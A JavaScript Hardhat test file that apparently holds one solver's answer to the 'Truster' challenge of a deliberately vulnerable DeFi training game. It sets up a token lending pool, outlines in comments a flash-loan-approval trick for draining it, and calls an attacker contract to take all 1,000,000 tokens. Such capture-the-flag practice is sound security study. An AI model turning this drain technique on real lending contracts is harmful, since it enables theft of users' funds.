const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        /*
        * My Thought process is that we would create a new contract initialise the DamnvValuable token together with the truster lender pool's address
        * With taht we would call transfer externally and transfer all the tokens to the attacker contract
        * But apparently i can't run .call{}
        * So the next option would be to use the flashloan with a call data to approve the dvt to spend the flashloan's tokens
        * with that we will transfer all the tokens with the transferFrom function
        */

       
        const AttackTrusterLenderPool = await ethers.getContractFactory("AttackTrusterLenderPool",attacker);
        const attackerContract = await AttackTrusterLenderPool.deploy(this.pool.address,this.token.address);
        await attackerContract.attack(attacker.address,this.token.address,attackerContract.address);


       // Attacker has taken all tokens from the pool
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

